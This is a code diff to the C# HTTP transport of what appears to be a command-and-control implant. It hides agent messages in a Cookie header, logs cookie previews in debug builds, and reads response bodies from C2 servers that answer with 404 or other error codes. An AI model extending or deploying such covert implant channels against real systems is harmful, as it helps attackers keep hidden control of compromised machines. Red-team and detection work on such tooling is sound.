@@ -504,6 +504,9 @@ namespace HttpxTransport
                 // Create HttpWebRequest for full control over headers
                 HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                 request.Method = variation.Verb;
+                // Ensure CookieContainer is null so we can manually set Cookie header
+                // If CookieContainer is set, manual Cookie header setting may be ignored
+                request.CookieContainer = null;
 #if DEBUG
                 DebugWriteLine($"[SendRecv] HTTP Method: {variation.Verb}");
                 DebugWriteLine($"[SendRecv] Final URL: {url}");
@@ -626,6 +629,11 @@ namespace HttpxTransport
                         request.Headers[HttpRequestHeader.Cookie] = cookieHeader;
 #if DEBUG
                         DebugWriteLine($"[SendRecv] Cookie header set: {variation.Client.Message.Name} (value length: {cookieValue.Length} chars)");
+                        // Show preview of cookie value (first 100 chars) and encoded length
+                        string cookiePreview = cookieValue.Length > 100 ? cookieValue.Substring(0, 100) + "..." : cookieValue;
+                        DebugWriteLine($"[SendRecv] Cookie value preview: {cookiePreview}");
+                        DebugWriteLine($"[SendRecv] Cookie header length: {cookieHeader.Length} chars");
+                        DebugWriteLine($"[SendRecv] Cookie header (first 200 chars): {cookieHeader.Length > 200 ? cookieHeader.Substring(0, 200) + "..." : cookieHeader}");
 #endif
                         break;
 
@@ -664,7 +672,7 @@ namespace HttpxTransport
                 }
 
                 // Get response
-                string response;
+                string response = null;
                 HttpWebResponse httpResponse = null;
 #if DEBUG
                 DebugWriteLine($"[SendRecv] Sending {variation.Verb} request to: {url}");
@@ -700,9 +708,53 @@ namespace HttpxTransport
                         }
                     }
                 }
+                catch (WebException webEx)
+                {
+                    // Some C2 servers return 404/other error codes but still include valid response data
+                    // Check if we have an HttpWebResponse with a body we can read
+                    if (webEx.Response is HttpWebResponse errorResponse)
+                    {
+                        httpResponse = errorResponse;
+#if DEBUG
+                        DebugWriteLine($"[SendRecv] WebException caught, but response available: {errorResponse.StatusCode} {errorResponse.StatusDescription}");
+                        DebugWriteLine($"[SendRecv] Attempting to read response body despite error status");
+#endif
+                        using (Stream responseStream = errorResponse.GetResponseStream())
+                        {
+                            if (responseStream != null)
+                            {
+                                using (StreamReader reader = new StreamReader(responseStream))
+                                {
+                                    response = reader.ReadToEnd();
+#if DEBUG
+                                    DebugWriteLine($"[SendRecv] Successfully read response body ({response.Length} chars) despite error status");
+#endif
+                                    // Continue processing - don't treat as error if we got response data
+                                }
+                            }
+                            else
+                            {
+                                // No response stream, rethrow the exception
+                                throw;
+                            }
+                        }
+                    }
+                    else
+                    {
+                        // No HttpWebResponse, rethrow the exception
+                        throw;
+                    }
+                }
                 finally
                 {
-                    httpResponse?.Close();
+                    // Don't close httpResponse here if we're going to use it later
+                    // It will be closed after we process the response
+                }
+
+                // Ensure we got a response
+                if (response == null)
+                {
+                    throw new InvalidOperationException("No response data received from server");
                 }
 
                 HandleDomainSuccess();
@@ -714,6 +766,9 @@ namespace HttpxTransport
                 byte[] untransformedData = TransformChain.ApplyServerTransforms(responseBytes, variation.Server.Transforms);
                 
                 string responseString = Encoding.UTF8.GetString(untransformedData);
+                
+                // Close response after we've read all data
+                httpResponse?.Close();
                 
 #if DEBUG
                 try
